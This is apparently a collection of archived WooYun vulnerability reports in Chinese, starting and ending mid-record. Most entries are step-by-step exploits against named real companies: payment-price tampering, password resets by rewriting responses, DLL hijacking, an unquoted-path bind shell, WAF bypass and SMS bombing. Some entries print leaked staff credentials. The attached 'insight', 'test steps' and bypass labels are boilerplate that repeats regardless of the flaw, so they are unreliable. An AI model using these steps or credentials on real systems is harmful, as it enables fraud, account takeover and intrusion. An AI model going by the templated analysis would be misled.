**详情**: iOS日历在解析显示名时，当遇到用户名有特殊字符组合时会发生字符串溢出，导致访问该日历事件直接闪退，在日历开始提醒前会一直白屏幕直到攻击时间结束。而iOS的Today模块，即屏幕从上往下拉的界面，会因为实时扫描最新日历，当这个日历是某天第一个的时候，iOS设备会在当天凌晨0点开始白苹果，直至攻击时间结束。1、会议接收人只需要有一个显示名中包含两对括号特殊组合；2、会议开始前被邀请的所有iOS用户出现故障，白屏黑苹果，黑屏白苹果均有，如接上电源线因循环重启，每隔5s响一声（手机接上充电线的声音）3、会议过期，所有有故障的收件人均自动恢复。4、当这个日历是某天第一个的时候，iOS设备会在当天凌晨0点开始白苹果，直至会议结束。

**POC**: 截图：视频：http://**.**.**.**/s/1sjKHm1J小结：iOS8.0以后的bug，8.0之前不会白苹果，但访问问题日历仍会闪退

**绕过**: 直接利用

**修复**: 1、修改邮箱显示名2、取消恶意日历邀请，删除会议通知邮件根本解决方法：建议苹果公司解析字符串溢出导到系统崩溃（白苹果）的错误逻辑。
---

---
### [wooyun-2012-012997] 某客运公司网上购票系统支付漏洞
**厂商**: 上海南站长途客运有限公司 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 票价太贵了。改一改吧。

**POC**: 成功了 到此为止。

**绕过**: 直接利用

**修复**: 你们比我专业。
---

---
### [wooyun-2013-039435] 瑞星多款杀毒软件DLL劫持漏洞
**厂商**: RiSing | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 瑞星多款杀毒软件在启动时或运行中会加载一些不带路径的dll文件（这些文件没有随杀毒软件一起安装），导致恶意攻击者可以伪造该DLL文件放置于可能的加载路径如系统目录下用于劫持，绕过杀软自身防护，实现提权或关闭杀软安全防护等动作，危害用户安全。所有测试版本均为官网10月11日16时后更新的版本。瑞星杀毒软件V16软件版本：[IP已脱敏]ravmond.exe---->rexfs.dllrstray.exe---->my32.dllrsmain.exe---->my32.dll瑞星杀毒软件2011软件版本：[IP已脱敏]ravmond.exe---->logproxy.dll瑞星全功能安全软件2011软件版本：[IP已脱敏]ravmond.exe---->logproxy.dllravmond.exe---->spoon_if.dllrstray.exe---->logp

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 严格审查DLL文件加载。
---

---
### [wooyun-2012-014709] 绕过某互联网公司手机管家防盗功能
**厂商**: 安全管家 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 后台管理

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.在手机防盗锁屏，输入防盗密码界面，按home键，可以暂时切换进去手机正常界面，甚至此时会直接绕过手机原本设置的屏幕图案锁。2.在手机管家防盗功能重新屏蔽手机操作界面前，将手机管家给卸载掉。或者使用各类优化工具将后台服务暂时KILL掉。就可以正常使用手机了。3.在任务管理器清楚手机管家的数据，原本手机管家的各种密码就会全部消失，从里到外这个手机就完全属于小偷了。并且可以自己再重新设置防盗口令。环境：android 版本 4.0.4 手机管家 3.7.1 for android build571

**POC**: 无图无真相，自己去测试。我提交过疼讯TSRC，给忽略了，然后偷偷更新了手机管家的版本。最新的没兴趣测试了。

**绕过**: 过滤绕过

**修复**: 对TSRC无力吐槽了，自己爱怎么补怎么补。
---

---
### [wooyun-2015-0160370] 中煤建安办公系统设计逻辑缺陷造成敏感信息泄露
**厂商**: 中煤建筑安装工程集团有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中煤建筑安装工程集团有限公司将OA办公自动化系统放置在互联网上，由于OA系统登陆处防护不足，可暴力破解，并且轻松破解大量弱口令登陆系统，由于员工安全意识不足，大量敏感信息甚至是商业秘密泄露（工资、财务信息、会议记录、年度计划等等），挺严重的。

**POC**: 测试目标：**.**.**.**/1、破解成功的弱口令2、登陆3、工资单4、通过OA还可访问综合管理信息系统5、弱口令包括：yuhai/123456qiuyue/123456zhouyi/123456hudacheng/123456......

**绕过**: 直接利用

**修复**: 1、不应该将OA等重要系统放在互联网；2、修改弱口令，增加验证码；3、重视商密保护
---

---
### [wooyun-2015-0157114] 猫扑Android手机客户端任意账号密码可被重置
**厂商**: 猫扑 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: app详情：mop_android_4.0.3_1021800.apkapk  : com.mop.activity, 26, 4.0.3, 掌上猫扑apkmd5: 4b60c131cd09a882250d7cd1f10cfc7f证书 :certmd5: 1133d0601b2c16a9891625a3b4b611d7issuer: C=100028, ST=Beijing, L=Beijing, O=Beijing Qian Xiang Hu Lian Technology Development LLC, OU=Mop Dept., CN=Ji Weisubject: C=100028, ST=Beijing, L=Beijing, O=Beijing Qian Xiang Hu Lian Technology Development LLC, OU=Mop Dept., CN=Ji 

**POC**: 1、在猫扑上随便找的一个账号：踏平菜园子2、输入该账号，密码找回。3、选择邮箱找回，输入验证码123456.4、将服务器返回的error修改为success后再执行。5、之后按正常流程进行密码重置，密码修改成功。6、传播文化是大家的责任，帮大哥打个广告。

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0159025] 某家电厂商某站逻辑漏洞泄漏用户敏感信息（姓名+身份证+邮箱+手机）
**厂商**: 某家电厂商 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: inurl:https://example.com/[已脱敏]

**POC**: https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-019332] 丁丁数码商城支付漏洞一分钱买个ipad
**厂商**: 丁丁数码商城 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 提交参数客户端可控+没有sign验证确认支付的时候出现漏洞：结果：

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 把价格什么的从服务器提，加数据验证。
---

---
### [wooyun-2015-0102145] i厦门一站式服务平台某处设计缺陷，可造成用户信息泄漏
**厂商**: 厦门市信息技术服务中心 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先我得承认系统比刚上线那会安全性高了很多，关闭了那些不和谐的子系统，但是在密码找回功能上，仍然存在设计缺陷1#用户信息泄漏密码找回第一步，输入用户名 /手机 /身份证号/邮箱 均可，进入下一步抓包可以看到，系统返回了该用户的身份证号、电话号码、邮箱、姓名（低级用户、未认证用户，获取到的信息相应减少）可能有人会问，如何获取到用户的登录名，很简单，系统里有，在网页应用的评论处，有大批用户名2#我不得不吐槽这个点赞功能，我一个人给点了34次3#短信任意发送，无次数限制，在绑定手机处，对已绑定的手机号进行修改，在输入框中，输入短信的接收目标，然后开始搞，抓包，重放应该还有其它地方，得好好找找重现的话，以这位哥们为例joceazheng吧，只能重现找回密码了，如果无聊的话，可以给他找回密码抓包重放，短信轰炸

**POC**: https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 短信次数限制，时间间隔限制忘记密码返回值
---

---
### [wooyun-2016-0168604] 考满分网某功能设计逻辑缺陷可重置任意账号密码
**厂商**: 考满分 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 考满分网站  **.**.**.**前提：1. 用一个邮箱注册账号(wtwtest@**.**.**.**)，用来接收修改密码的链接2. 目标账号用户名(Wvictim)步骤：1.点击登录界面的“找回密码”，输入邮箱wtwtest@**.**.**.**，用来接收修改密码的链接。2. 进入邮箱，点击链接，进入修改密码的界面，这里设新密码为“password"。3. submit时抓包，修改用户名为Wvictim.4. 密码修改成功！验证：用户名Wvictim，密码passwordOh yeah~

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 重新设计。
---

---
### [wooyun-2014-065005] CUUMALL 注入 1-4
**厂商**: cuumall.com | **年份**: 2014 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 参数注入

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 找了几个没zend的文件来看看 。第一处ali/notify_url.php中$alipayNotify = new AlipayNotify($aliapy_config);$verify_result = $alipayNotify->verifyNotify();if($verify_result) {//验证成功///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////请在这里加上商户的业务逻辑程序代//——请根据您的业务逻辑来编写程序（以下代码仅作参考）——//获取某电商平台的通知返回参数，可参考技术文档中服务器异步通知参数列表$out_trade_no	= $_POST['

**POC**: 见上面。

**绕过**: 编码绕过

**修复**: 对一些该intval的就intval。
---

---
### [wooyun-2012-010291] 铁血商城支付漏洞重现！！！
**厂商**: 北京铁血科技 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上次发过了,自己去测试发现多了个hidden和GET:money=还有表单的hidden多了几个参数。https://example.com/[已脱敏]

**POC**: 给剑心送件衣服吧。嗯。。

**绕过**: 直接利用

**修复**: 服务器验证吧,如:龙牙短袖战术衬衫 衣服是这个服务端查询:Select money form 表 where Shopname = '龙牙短袖战术衬衫'；龙牙短袖战术衬衫需要严格过滤。然后money赋值去订单那里,到最后交易一步验证,如果钱不同就message("参数错误,请重新操作！")
---

---
### [wooyun-2014-051449] RenderBus通过某电商平台充值存在汇率逻辑漏洞
**厂商**: Renderbus云渲染农场 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: RenderBus 通过某电商平台充值 RMB 为等数额 USD/GBP/EUR，比如 1RMB 充值后变成了 1USD。进入充值页，选择USD/GBP/EUR充值，输入金额，支付方式显示为空，直接不理会点充值按钮，好了你看某电商平台说了1USD只要付1RMB就行。这是我某电商平台交易成功的截图：你看后台里跟我说我账户充了1.06GBP和1USD。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修改逻辑。
---

---
### [wooyun-2015-0104030] 某互联网公司轻聊版调用CreateProcess漏洞
**厂商**: 某互联网公司 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 参数注入

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 还是那个问题，createprocess的第一个参数设为NULL了，参数并没有做“”包含,导致精心放置在系统目录下的 “C:\Program.exe”被加载执行。

**POC**: 1. 丢一个Program.exe到系统目录2. 启动某互联网公司轻聊3. 某互联网公司启动，但是同时也后台加载了Program.exe4. Program.exe是个shell，开了个2345端口。目标机器信息5. telnet连它的2345端口6. 成功连上，随便看下系统信息

**绕过**: 直接利用

**修复**: 乌云里有很多童靴都已经提过了，也都给了完善的修复指导，我就不重复了。MSDN：  https://example.com/[已脱敏]
---

---
### [wooyun-2014-050445] 某IM软件群共享病毒文件扫描绕过
**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 上传功能

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 简单的就是说 上传病毒文件 群共享的病毒扫描无效...首先我们上传一个病毒文件 1.rar 到群共享 看看 果断报毒。禁止上传然后我们新建一个空的压缩文件  将1.rar  直接拖入 这样就形成了一个双重压缩的....然后果断上传成功 没有拦截...可对用户造成威胁...不法分子可利用此漏洞传送木马文件 然后你懂得

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 你们会
---

---
### [wooyun-2015-0135544] 七夕我是如何一分钱看电影的(微影时代客户端缺陷)
**厂商**: wepiao.com | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 其实这是一类问题。app开发者为了开发方便，经常会把一些用来对敏感信息签名验证的私钥硬编码在客户端里。这样通过简单的逆向就能拿到这些私钥和签名算法，来伪造一些敏感的行为。这里以微票儿安卓客户端中的某互联网公司支付为例，展示下这种漏洞的危害。主要存在的问题是，在用某互联网公司支付时，订单信息由客户端生成，服务端并没有对支付的价格做验证，因此可以更改为任意价格，一分钱包场。下好订单后选某互联网公司支付，burp抓包。POST /pay/genprepay?access_token=yqaiSYReJm75yYPe18F3XFkYM47w95DSGYB1GiLwBRIWt-7JC0eUDV8turLu2eU6ZeqNohoTEwVphDNoNoc8ZNUuTpxUrmR2SPOJWYVTwxU HTTP/1.1Accept: application/jsonContent-type: application/jsonC

**POC**: 支付成功即可收到短信。

**绕过**: 编码绕过

**修复**: 将订单生成等敏感逻辑放在服务端。不要过分相信客户端的数据，即便已经进行签名验证。
---

---
### [wooyun-2015-0138173] 某旅游平台客户端升级存在安全隐患可被替换为木马
**厂商**: 某旅游平台旅行网 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.某旅游平台客户端升级新版本的时候会进行MD5的校验，计算下载到本地的客户端的MD5数值以及服务端的返回的预期MD5数值是否匹配2.但是某旅游平台客户端所有的请求均是HTTP明文的，下面是请求md5值和新版本客户端下载链接的请求(1). 请求md5值和下载链接的url，经过验证该MD5确实是对应下载链接的APK的MD5(2). 下载APK应用的请求3.HTTP请求无任何签名和加密机制，非常容易进行篡改，利用中间人攻击可以同时对MD5和下载链接进行篡改，这样便可以绕过校验逻辑，这样便可以控制某旅游平台客户端可以安装任意的应用，包括木马病毒等恶意应用

**POC**: 具体的漏洞风险的原因都在截图中，如果需要的话我会做一个MITM的视频演示下，大家都是做安全的应该都明白这样风险有多大，否则客户端也没有必要进行md5的验证

**绕过**: 过滤绕过

**修复**: 1.使用HTTPS传输MD5和下载链接2.使用加密的方式传输MD5和下载链接
---

---
### [wooyun-2013-041625] 天津图书大厦网上购物商城逻辑缺陷可导致0元购买任意商品
**厂商**: www.tjbb.com | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 购物车商品数量在本地进行校验，删除校验就可以调成负数，多买几个一抵消，免费不是梦~~校验语句：去掉后，

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 订单审核更加严谨点，最好在服务器端做校验~
---

---
### [wooyun-2015-0102881] 贝备网某高危逻辑支付漏洞可成功到货
**厂商**: bbready.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 不是简单的修改商品数量、金额的问题，而是在发送的请求读数据时未及时锁住数据信息导致可多线程并发多次利用优惠劵。刚注册的账号会赠送一张10元优惠劵，买点东西吧：）选了商品一共34.18元：使用10元优惠劵在提交订单时，多线程并发：可查看我的订单：201503211980927，201503211936370两个订单都使用了优惠劵。只用了两个线程，更多线程和金额更大的优惠劵会给厂商带来严重的损失。都是按照正常的流程来的，只要支付其余金额肯定会发货：

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强业务逻辑。排查其他业务功能，如：注册，提现等先读取数据，后修改数据的功能。
---

---
### [wooyun-2014-065024] CUUMALL可以不用花钱买东西
**厂商**: cuumall.com | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我们登录后选择一个进行支付：url:https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-012231] 某vpn自动发货平台在线支付漏洞
**厂商**: 赛讯VPN平台 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某vpn自动发货平台在线支付漏洞，0.01元可以买1年的vpn了~~虽然对我用处不大

**POC**: 可以自己控制钱数0.01可以买一个季度的了

**绕过**: 直接利用

**修复**: 验证即可···求几个年会员卡~~
---

---
### [wooyun-2014-059796] e乐充公交卡充值支付漏洞（可实现不花钱充值）
**厂商**: 北京亿阳汇智通科技股份有限公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.应用介绍：e乐充公交卡是亿阳信通旗下子公司亿阳汇智通公司发布的中国首款NFC手机支付APP软件，集公交卡手机充值，余额查询，NFC支付功能为一身。某支付钱包8.1.0.43001版本开始支持NFC为公交卡一卡通充值，其最终是调用e乐充公交卡应用，使用某支付钱包来支付完成金额充值。e乐充公交卡作为某电商平台的一个服务（独立的应用服务），在某电商平台客户端上提供下载安装。测试版本：apk  : com.boco.alipay.activity, 8, 1.0.08, e乐充公交卡apkmd5: 96a320dd7f311b0fddd9b4223bd10012证书 :certmd5: d5eb2cba5245554667e2a38518a4e27dissuer: C=CH, ST=Beijing, L=Beijing, O=BOCO_HZT, OU=BOCO_HZT, CN=SJYKTsubject

**POC**: 3.漏洞利用：①获取第一次某电商平台支付成功时Pay函数的返回值，这个可通过Hook来实现。②通过Hook Pay函数，修改Pay函数的返回值，使得在取消支付时Pay函数的返回值为第一次某电商平台支付成功时Pay函数的返回值。③再次充值支付操作，在支付界面取消支付，撤销充值。截图如下：原始账户金额截图公交卡充值某电商平台支付30元后账户余额截图Hook Pay函数后修改返回值，再次充值支付操作，但在支付界面取消支付：取消支付截图此时提示贴卡，进行数据读写，但贴卡后显示交易异常，此时点击撤销按钮：贴卡异常截图充值金额退回提示截图某电商平台账单信息e乐公交卡充值记录e乐公交卡充退记录

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-06088] 搜狗桌面论坛业务逻辑错误
**厂商**: 某门户网站 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 步骤：1、登录搜狗桌面论坛进入个人中心页；2、修改个人资料并提交(当前用户的积分少于20)；3、程序给出的提示信息为“您的昵称已存在，请更换昵称”，如果写一个新的昵称，提交时给的提示是您的金币少于5，不能设置昵称；如果用户不想修改用户昵称的，只想修改别的信息呢？如自我介绍、联系方式啥的，那积分少于20的话，就永远不能修改了。备注“wooyun 编辑在验证这个问题时，先找个比较大众的名字登录论坛吧。

**POC**: 找个很大众的名字；

**绕过**: 直接利用

**修复**: 在想，贵公司的产品设计是怎么为用户考虑的？......
---

---
### [wooyun-2015-0103371] 氧气APP设计不当可一分钱买任意内衣（支付漏洞）
**厂商**: www.o2bra.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 正常请求：此处为金额：--0xKhTmLbOuNdArY-73B2CE94-7213-419A-8BB4-853A688850A5Content-Disposition: form-data; name="product_price"790修改后：

**POC**: 订单号：15150324094449 供验证

**绕过**: 直接利用

**修复**: 金额完全控制在server端，金额这种敏感数据不可由用户端控制！
---

---
### [wooyun-2012-012189] 某电商平台团购订单金额可在客户端修改并提交网银支付
**厂商**: 某电商平台商城 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 随手挑了一个杯具来团购，恩来到网银支付前的最后一个页面，然后开启firebug或者用chrome，把页面里的和价格有关的39统统改成了1块钱，然后提交跳转到某银行页面之后，果然只要支付1块钱

**POC**: 跳转到某银行页面之后，果然只要支付1块钱

**绕过**: 直接利用

**修复**: 金额做服务端验证，或者懒一点就把金额写到加盐的伪随机码里校验
---

---
### [wooyun-2014-053706] 某搜索引擎招聘官网逻辑漏洞
**厂商**: 某搜索引擎 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我本是一名大三狗！无奈大四要实习！于是向某搜索引擎招聘投递简历！奈何投简历的时候没看清楚！本来打算投安全和PHP方向的！结果简历全投到了WEB前端！某搜索引擎招聘对每个人简历投递的上限有要求！即为三封！超过三封就不能申请了！而且投递过的简历不能删除！这让我投错职位怎么办啊！于是就想办法进行绕过！下面进行详解！另求offer!我个人也参加了BCTF的！

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 进行数据处理！
---

---
### [wooyun-2013-036446] 最新TOM 任意密码修改漏洞
**厂商**: TOM在线 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先注册一个邮箱learing_test1@tom.com邮箱。设置密码保护，我的密码是123456，然后去密码找回中截断找回包。写上刚才的答案，下一步。第三步就是抓包，修改成目标的邮箱。最后就是成功修改tom@tom.com的密码

**POC**: (见原文)

**绕过**: 截断攻击

**修复**: 加验证比较好！来个礼物吧，呵呵。
---

---
### [wooyun-2014-085265] 利群商城支付漏洞
**厂商**: 利群商城 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 闲的没事，在网上看看有没有利群烟买。原来香烟不能再网上销售.无意间发现有个利群商城。没想到有支付漏洞。https://example.com/[已脱敏] 付款成功订单状态该公司确实是大的网上商城啊。有声有色的现金支付却是要注意安全啊。本流程只为安全测试。地址都为测试地址，表查我水表.

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们更专业
---

---
### [wooyun-2015-0165183] 某运营商某站设计逻辑缺陷漏洞一枚
**厂商**: 某运营商 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/ga/密码：abcd1234OA需要认证登录，用用户名密码来撞邮箱不深入了

**POC**: http://**.**.**.**/ga/密码：abcd1234OA需要认证登录，用用户名密码来撞邮箱不深入了

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0126851] 广州新白云机场通用自助乘机柜台跳出沙盒漏洞
**厂商**: 广州白云机场 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 经过实验。。一排的终端机左下角点几下就会弹出cmd窗口如图。。一排的终端机都被我弄弹出来cmd窗口了

**POC**: 原本是这样的 这是正常的时候。。点几下就弹出cmd了调出虚拟键盘ipconfig目测可控制内网单核。。怪不得容易死机。。

**绕过**: 直接利用

**修复**: 机场赶人了。。没有更深入测试。。怎么修复你们更专业！p.s:白云机场好乱，外面旅馆拉客的都身穿白制服手拿对讲机拉客。。根本判断不出真假
---

---
### [wooyun-2015-0153566] 电商安全之阿哥汇设计缺陷导致支付漏洞（0.1元任意购）
**厂商**: 某农业公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 官网地址https://example.com/[已脱敏]

**POC**: order_id=38923&order_sn=20151111143930163754&order_amount=55挖洞不容易啊，给个首呗

**绕过**: 直接利用

**修复**: 价格就不用写在包里了吧
---

---
### [wooyun-2014-087788] 云锁最新版1.3.145设计缺陷可Bypass
**厂商**: 云锁 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 云锁存在同样的防护绕过问题，一次性判断包大小为7250byte以下，测试过程如下：n为填充包内容，设置n大小为2328时，可以正常访问页面，但是会提示防护拦截SQL脚本设置n为2329时，就能成功绕过了所以测试结果表明：云锁一次性解析包大小为7250byte以下，超过的部分不被防护脚本检测

**POC**: 详细

**绕过**: 过滤绕过

**修复**: https://example.com/[已脱敏] 这里只讲了IPS的防护原理，修复我也不知道
---

---
### [wooyun-2015-0151955] NanoHttpd一处设计不当可导致remote-hddr被覆盖
**厂商**: NanoHttpd | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: nanohttpd服务器在core/src/main/java/fi/iki/elonen/NanoHTTPD.java中，先将tcp包中的inetaddr地址取出放入headers['remote-hddr']中，再提取http请求中的header放入headers中，导致了remote-addr可被轻易覆盖nanohttpd经常嵌入在java程序中提供简易的http服务if (null != this.remoteIp) {this.headers.put("remote-addr", this.remoteIp);this.headers.put("http-client-ip", this.remoteIp);}//先提取出了tcp包中的remoteIp// Create a BufferedReader for parsing the header.BufferedReader 

**POC**: 某搜索引擎wormhole就用了这货，请求的时候加一个header   remote-addr: **.**.**.**就可以轻易绕过限制。你们都懂

**绕过**: 直接利用

**修复**: 交换读header和将ip地址写入header变量的顺序
---

---
### [wooyun-2015-0158436] 某运营商河北某平台管理系统设计逻辑缺陷（人员信息定位）
**厂商**: 某运营商 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

